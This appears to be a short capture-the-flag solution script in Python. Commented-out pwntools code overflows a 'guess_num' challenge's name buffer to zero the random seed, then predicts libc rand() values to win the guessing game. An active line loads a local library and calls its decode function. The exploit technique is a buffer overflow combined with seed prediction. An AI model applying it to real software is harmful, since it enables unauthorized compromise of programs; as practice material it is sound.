from pwn import *
from ctypes import cdll

# p = process("./guess_num")
# p = remote("111.198.29.45" , 30880)
# p.sendlineafter("Your name:" , "a" * 0x20 + p32(0) * 2)

# libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
# libc.srand(0)
# for i in range(10):
# 	value = libc.rand() % 6 + 1
	# p.sendlineafter("guess number:" , str(value))
# p.interactive()
	

libc = cdll.LoadLibrary("./libfirst_jni_ai.so")
print(libc.decode("iNETPPMM"))
